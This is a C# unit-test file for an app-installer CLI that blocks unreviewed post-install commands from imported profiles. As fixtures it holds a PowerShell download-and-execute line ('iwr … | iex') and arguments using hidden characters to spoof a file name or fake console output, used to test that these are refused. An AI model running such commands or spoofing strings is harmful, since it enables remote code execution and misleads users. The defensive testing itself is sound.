// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 iam-groot1

using System.Text.Json;
using CtrlZ.Core.Cli;
using CtrlZ.Core.Infrastructure;
using CtrlZ.Core.Install;
using CtrlZ.Core.Models;
using CtrlZ.Core.Safety;
using CtrlZ.Core.Services;

namespace CtrlZ.Core.Tests;

public sealed class CliTests : IDisposable
{
    private readonly TestDirectory _temp = new();
    private readonly AppPaths _paths;
    private readonly StringWriter _out = new();
    private readonly StringWriter _err = new();

    public CliTests()
    {
        _paths = new AppPaths(_temp.PathOf("data"));
        _paths.EnsureCreated();
    }

    public void Dispose() => _temp.Dispose();

    private ProfileOriginStore Origins => new(Path.Combine(_paths.State, "profile-origins.json"));

    private PostInstallApprovalStore Approvals => new(Path.Combine(_paths.State, PostInstallStep.ApprovalsFileName));

    private (CliRunner Runner, FakeInstaller Installer) Cli(
        ISourceInstaller? installer = null, bool elevated = true, bool busy = false, AppSettings? settings = null)
    {
        var fake = installer as FakeInstaller ?? new FakeInstaller(AppSource.LocalFile);
        var profiles = new ProfileStore(_paths, TestFactory.Log);
        var download = new DownloadService(_paths, TestFactory.Log);
        var winget = new WingetCli(new ProcessRunner(), TestFactory.Log);
        var engine = new InstallEngine(
            _paths, [installer ?? fake], new InstallStateStore(_paths.InstallStateFile, TestFactory.Log), profiles,
            new WingetBootstrapService(winget, download, new ProcessRunner(), _paths, TestFactory.Log), TestFactory.Log);

        var env = new CliEnvironment
        {
            Out = _out,
            Error = _err,
            Settings = settings ?? new AppSettings(),
            Profiles = profiles,
            Origins = Origins,
            Approvals = Approvals,
            FirstRun = new PostInstallFirstRunStore(Path.Combine(_paths.State, PostInstallFirstRunStore.FileName)),
            Engine = engine,
            IsElevated = () => elevated,
            AcquireLock = () => busy ? null : InstallLock.TryAcquire(@"Local\CtrlZ.Test." + Guid.NewGuid().ToString("n")),
            CreateDryRun = () => new DryRunRunner(
                (_, _) => Task.FromResult<IReadOnlyList<WingetPackage>>([]),
                (_, _) => throw new InvalidOperationException("no network in tests"),
                (_, _) => Task.FromResult<long?>(null),
                _ => true,
                _ => true),
            FileExists = _ => true,
            IsSigned = _ => true
        };

        return (new CliRunner(env), fake);
    }

    private static AppEntry App(string id, PostInstallCommand? command = null, params string[] after) => new()
    {
        Id = id,
        Name = id,
        Source = AppSource.LocalFile,
        LocalPath = "setup.exe",
        SilentArgs = "/S",
        AfterAppIds = after.ToList(),
        PostInstall = command
    };

    private static PostInstallCommand Safe(bool elevated = false) =>
        new() { Id = "c1", Executable = @"C:\Windows\System32\where.exe", Arguments = ["/?"], Enabled = true, RequiresElevation = elevated };

    private static PostInstallCommand Risky() =>
        new() { Id = "r1", Executable = "powershell.exe", Arguments = ["-c", "iwr https://x/y | iex"], Enabled = true };

    private string WriteProfile(params AppEntry[] apps) => WriteProfile(new AppProfile { Id = "p1", Name = "Shared", Apps = apps.ToList() });

    private string WriteProfile(AppProfile profile)
    {
        var path = _temp.PathOf("profile-" + Guid.NewGuid().ToString("n") + ".json");
        File.WriteAllText(path, JsonSerializer.Serialize(profile, JsonDefaults.Profile));
        return path;
    }

    // ---- parsing ---------------------------------------------------------------------------

    [Theory]
    [InlineData(new[] { "install", "p.json", "--yes", "--silent", "--allow-commands", "--allow-risky", "--json", "r.json" }, true)]
    [InlineData(new[] { "dry-run", "p.json", "--json", "r.json" }, true)]
    [InlineData(new[] { "list" }, true)]
    [InlineData(new[] { "--help" }, true)]
    [InlineData(new[] { "install" }, false)]
    [InlineData(new[] { "install", "a.json", "b.json" }, false)]
    [InlineData(new[] { "install", "p.json", "--force" }, false)]
    [InlineData(new[] { "install", "p.json", "--json" }, false)]
    [InlineData(new[] { "dry-run", "p.json", "--yes" }, false)]
    [InlineData(new[] { "list", "p.json" }, false)]
    [InlineData(new[] { "uninstall", "p.json" }, false)]
    public void Arguments_are_parsed_strictly(string[] args, bool valid)
    {
        Assert.Equal(valid, CliParser.Parse(args).IsValid);
    }

    [Fact]
    public void Parsed_install_options_are_all_kept()
    {
        var options = CliParser.Parse(["install", "p.json", "-y", "--allow-commands", "--json", "r.json"]).Options!;

        Assert.Equal(new CliOptions(CliCommand.Install, "p.json", false, true, true, false, "r.json"), options);
    }

    // ---- exit codes ------------------------------------------------------------------------

    [Fact]
    public async Task Usage_errors_exit_1_and_help_exits_0()
    {
        Assert.Equal(CliExitCode.Usage, await Cli().Runner.RunAsync(["install"]));
        Assert.Equal(CliExitCode.Success, await Cli().Runner.RunAsync(["help"]));
    }

    [Theory]
    [InlineData("missing")]
    [InlineData("garbage")]
    [InlineData("no-enabled-apps")]
    public async Task An_invalid_profile_exits_3(string kind)
    {
        var path = kind switch
        {
            "missing" => _temp.PathOf("nope.json"),
            "garbage" => _temp.Write("bad.json", "{ not json"),
            _ => WriteProfile(new AppEntry { Id = "a", Name = "a", Enabled = false })
        };

        Assert.Equal(CliExitCode.InvalidProfile, await Cli().Runner.RunAsync(["install", path, "--yes"]));
    }

    [Fact]
    public async Task Without_yes_the_plan_is_printed_and_nothing_installs()
    {
        var (cli, installer) = Cli();

        var exit = await cli.RunAsync(["install", WriteProfile(App("tool", Safe())), "--allow-commands"]);

        Assert.Equal(CliExitCode.Cancelled, exit);
        Assert.Empty(installer.Installed);
        Assert.Contains(@"C:\Windows\System32\where.exe /?", _out.ToString());
        Assert.Contains("Blocked - imported profile, review required", _out.ToString());
        Assert.Equal(ApprovalState.None, Approvals.StateOf("p1", "tool", Safe()));
    }

    [Fact]
    public async Task Another_running_install_exits_7()
    {
        var (cli, installer) = Cli(busy: true);

        Assert.Equal(CliExitCode.Busy, await cli.RunAsync(["install", WriteProfile(App("tool")), "--yes"]));
        Assert.Empty(installer.Installed);
    }

    [Fact]
    public async Task Admin_need_is_detected_up_front_and_exits_6()
    {
        var (cli, installer) = Cli(elevated: false);

        var exit = await cli.RunAsync(["install", WriteProfile(App("tool", Safe(elevated: true))), "--yes", "--allow-commands"]);

        Assert.Equal(CliExitCode.NeedsAdmin, exit);
        Assert.Empty(installer.Installed);
        // A refused run changes nothing: the consent of --allow-commands is not recorded.
        Assert.Equal(ApprovalState.None, Approvals.StateOf("p1", "tool", Safe(elevated: true)));
    }

    [Fact]
    public async Task Continue_without_admin_installs_unelevated()
    {
        var (cli, installer) = Cli(elevated: false);

        var exit = await cli.RunAsync(["install", WriteProfile(App("tool", Safe(elevated: true))), "--yes", "--continue-without-admin", "--silent"]);

        Assert.Equal(CliExitCode.Success, exit);
        Assert.Equal(new[] { "tool" }, installer.Installed);
    }

    [Fact]
    public async Task A_refused_risky_run_records_no_approval_and_no_first_run_consent()
    {
        var (cli, installer) = Cli();
        var profile = new AppProfile { Id = "p1", Name = "Shared", Apps = [App("tool", Safe()), App("danger", Risky())] };

        // --allow-risky approves the risky command prospectively; refusing later (no admin) must not keep it.
        var refused = await Cli(elevated: false).Runner.RunAsync(
            ["install", WriteProfile(profile), "--yes", "--allow-commands", "--allow-risky"]);

        Assert.Equal(CliExitCode.NeedsAdmin, refused);
        Assert.Equal(ApprovalState.None, Approvals.StateOf("p1", "danger", Risky()));
        Assert.Equal(ApprovalState.None, Approvals.StateOf("p1", "tool", Safe()));
        Assert.Empty(new PostInstallFirstRunStore(Path.Combine(_paths.State, PostInstallFirstRunStore.FileName)).ConfirmedFor("p1"));
        Assert.Empty(installer.Installed);
    }

    [Fact]
    public async Task A_failed_app_exits_2_and_a_failed_dependency_exits_4()
    {
        var failing = new FakeInstaller(AppSource.LocalFile, app => app.Name == "broken" ? 99 : 0);
        Assert.Equal(CliExitCode.PartialFailure,
            await Cli(failing).Runner.RunAsync(["install", WriteProfile(App("broken"), App("ok")), "--yes", "--silent"]));

        var dependency = new FakeInstaller(AppSource.LocalFile, app => app.Name == "runtime" ? 99 : 0);
        Assert.Equal(CliExitCode.DependencyFailure,
            await Cli(dependency).Runner.RunAsync(["install", WriteProfile(App("runtime"), App("app", null, "runtime")), "--yes", "--silent"]));
    }

    // ---- commands --------------------------------------------------------------------------

    [Fact]
    public async Task Commands_of_an_imported_profile_stay_blocked_with_yes_alone()
    {
        var (cli, installer) = Cli();

        var exit = await cli.RunAsync(["install", WriteProfile(App("tool", Safe())), "--yes", "--silent"]);

        Assert.Equal(CliExitCode.Success, exit);
        Assert.Equal(new[] { "tool" }, installer.Installed);
        Assert.Equal(ApprovalState.None, Approvals.StateOf("p1", "tool", Safe()));
        Assert.Contains("command not run", _out.ToString());
    }

    [Fact]
    public async Task Allow_commands_with_yes_approves_exactly_the_printed_commands_and_not_risky_ones()
    {
        var (cli, _) = Cli();
        var path = WriteProfile(App("tool", Safe()), App("danger", Risky()));

        var exit = await cli.RunAsync(["install", path, "--yes", "--allow-commands", "--silent"]);

        Assert.Equal(CliExitCode.Success, exit);
        Assert.Equal(ApprovalState.Current, Approvals.StateOf("p1", "tool", Safe()));
        Assert.Equal(ApprovalState.None, Approvals.StateOf("p1", "danger", Risky()));
        Assert.Contains("post-install command ok", _out.ToString());
    }

    [Fact]
    public async Task A_risky_command_that_would_run_needs_allow_risky()
    {
        var profile = new AppProfile { Id = "local1", Name = "Mine", Apps = [App("danger", Risky())] };
        var path = WriteProfile(profile);
        var origins = Origins;
        origins.Set(profile.Id, ProfileOrigin.Local, ProfileOriginRecorder.ContentHash(new ProfileStore(_paths, TestFactory.Log).Load(path)));
        var (cli, installer) = Cli();

        var exit = await cli.RunAsync(["install", path, "--yes", "--silent"]);

        Assert.Equal(CliExitCode.Cancelled, exit);
        Assert.Empty(installer.Installed);
        Assert.Contains("--allow-risky", _err.ToString());
    }

    // ---- report ----------------------------------------------------------------------------

    [Theory]
    [InlineData(false)]
    [InlineData(true)]
    public async Task The_json_report_includes_notes_only_with_the_opt_in(bool optIn)
    {
        var app = App("tool");
        app.Notes = "secret licence key";
        var report = _temp.PathOf("report.json");
        var (cli, _) = Cli(settings: new AppSettings { IncludeNotesInReports = optIn });

        await cli.RunAsync(["install", WriteProfile(app), "--yes", "--silent", "--json", report]);

        var json = File.ReadAllText(report);
        Assert.Equal(optIn, json.Contains("secret licence key"));
        Assert.DoesNotContain("secret licence key", _out.ToString());
        Assert.Contains("\"exitCode\": 0", json);
    }

    // ---- lock ------------------------------------------------------------------------------

    [Fact]
    public void The_install_lock_is_exclusive_and_released_on_dispose()
    {
        var name = @"Local\CtrlZ.Test." + Guid.NewGuid().ToString("n");

        using (var first = InstallLock.TryAcquire(name))
        {
            Assert.NotNull(first);
            Assert.Null(InstallLock.TryAcquire(name));
        }

        using var again = InstallLock.TryAcquire(name);
        Assert.NotNull(again);
    }

    // ---- end to end ------------------------------------------------------------------------

    [Fact]
    public async Task End_to_end_with_a_real_installer_exe_blocked_then_allowed()
    {
        // A real exe stands in for an installer: where.exe /? exits 0. The post-install command
        // is the same harmless call, run through the real runner.
        var where = @"C:\Windows\System32\where.exe";
        Assert.True(File.Exists(where));
        var app = new AppEntry
        {
            Id = "fake",
            Name = "Fake setup",
            Source = AppSource.LocalFile,
            LocalPath = where,
            SilentArgs = "/?",
            PostInstall = Safe()
        };
        var path = WriteProfile(app);
        var real = new LocalFileSourceInstaller(new FileInstallService(_paths, new ProcessRunner(), TestFactory.Log));

        var first = await Cli(real).Runner.RunAsync(["install", path, "--yes", "--silent"]);
        Assert.True(first == CliExitCode.Success, _out + Environment.NewLine + _err);
        Assert.Contains("command not run", _out.ToString());

        _out.GetStringBuilder().Clear();
        var second = await Cli(real).Runner.RunAsync(["install", path, "--yes", "--allow-commands", "--silent"]);
        Assert.Equal(CliExitCode.Success, second);
        Assert.Contains("post-install command ok", _out.ToString());
    }

    // ---- review fixes ----------------------------------------------------------------------

    [Theory]
    [InlineData("good.reg\r\n       Blocked - imported profile, review required")]
    [InlineData("good.reg\u001b[2K")]
    [InlineData("evil\u202Egnp.reg")]
    public async Task Hidden_characters_are_printed_visibly_and_never_approved(string argument)
    {
        var command = new PostInstallCommand { Id = "c1", Executable = @"C:\Windows\System32\where.exe", Arguments = [argument], Enabled = true };
        var (cli, _) = Cli();

        await cli.RunAsync(["install", WriteProfile(App("tool", command)), "--yes", "--allow-commands", "--silent"]);

        Assert.Equal(ApprovalState.None, Approvals.StateOf("p1", "tool", command));
        Assert.Contains("hidden characters", _err.ToString());
        Assert.DoesNotContain(argument, _out.ToString());
        Assert.Contains("\\u", _out.ToString());
    }

    [Fact]
    public async Task A_profile_with_duplicate_app_ids_is_invalid()
    {
        var exit = await Cli().Runner.RunAsync(["install", WriteProfile(App("same"), App("same")), "--yes"]);

        Assert.Equal(CliExitCode.InvalidProfile, exit);
    }

    [Fact]
    public async Task Dry_run_console_output_never_contains_notes_even_with_the_opt_in()
    {
        var app = App("tool");
        app.Notes = "secret licence key";
        var report = _temp.PathOf("dry.json");

        await Cli(settings: new AppSettings { IncludeNotesInReports = true }).Runner
            .RunAsync(["dry-run", WriteProfile(app), "--silent", "--json", report]);

        Assert.DoesNotContain("secret licence key", _out.ToString());
        Assert.Contains("secret licence key", File.ReadAllText(report));
    }

    [Fact]
    public void A_lock_that_cannot_be_opened_counts_as_busy_instead_of_crashing()
    {
        // An invalid name makes the mutex constructor throw inside the lock thread.
        Assert.Null(InstallLock.TryAcquire(@"Local\" + new string('x', 300) + @"\bad\name"));
    }
}
